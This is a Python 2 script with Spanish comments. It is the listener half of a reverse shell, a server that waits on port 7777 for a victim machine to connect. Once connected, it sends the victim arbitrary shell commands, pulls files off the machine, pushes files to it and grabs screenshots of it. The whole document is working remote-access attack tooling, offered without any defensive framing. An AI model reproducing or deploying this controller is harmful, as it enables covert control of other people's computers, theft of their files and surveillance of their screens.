#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import base64

def shell():
	current_dir = target.recv(1024)
	count = 0
	while True:
    	# Cambia el simbolo de la shell
		comando = raw_input("{}~#: ".format(current_dir))
		# Si recibe un exit, envía el comando y cierra el bucle
		if comando == "exit":
			target.send(comando)
			break
		# Si recibe cd, envía el comando y actualiza la variable de directorio actual por la ruta que hayamos indicado
		elif comando[:2] == "cd":
			target.send(comando)
			res = target.recv(1024)
			current_dir = res
		# Si recibe un parametro vacío como puede ser un Enter, el bucle sigue corriendo
		elif comando == "":
			pass
		# Si se ejecuta el comando "download", crea un fichero con el mismo nombre que vamos a descargar y escribe los datos encriptados en Base64
		elif comando[:8] == "download":
			target.send(comando)
			with open(comando[9:], 'wb') as file_download:
				datos = target.recv(30000)
				file_download.write(base64.b64decode(datos))
		# Si se ejecuta el comando "upload", hace el procedimiento inverso a la descarga.
		elif comando[:6] == "upload":
			try:
				target.send(comando)
				with open(comando[7:], 'rb') as file_upload:
					target.send(base64.b64encode(file_upload.read()))
			except:
				print("Ocurrio un problema en la subida")
		elif comando[:10] == "screenshot":
			target.send(comando)
			with open("monitor-%d.png" % count, 'wb') as screen:
				datos =  target.recv(1000000)
				data_decode = base64.b64decode(datos)
				if data_decode == "fail":
					print("No se pudo tomar la captura")
				else:
					screen.write(data_decode)
					print("Captura correcta")
					count = count+1
		else:
			target.send(comando)
			res = target.recv(30000)
			# Recibe el 1 que hemos mandado desde el cliente y continua el bucle
			if res == "1":
				continue
			else:
				print(res)

def upserver():
	global server
	global ip
	global target
	
	# INET para IPv4 y STREAM para puertos TCP
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	# Le ponemos a la escucha en la IP y el puerto indicado
	server.bind(('192.168.1.110',7777))
	server.listen(1)
	
	print("Corriendo servidor y esperando conexiones...")
	
	target, ip = server.accept()
	print("Conexion recibida de: " + str(ip[0]))

upserver()
shell()
server.close()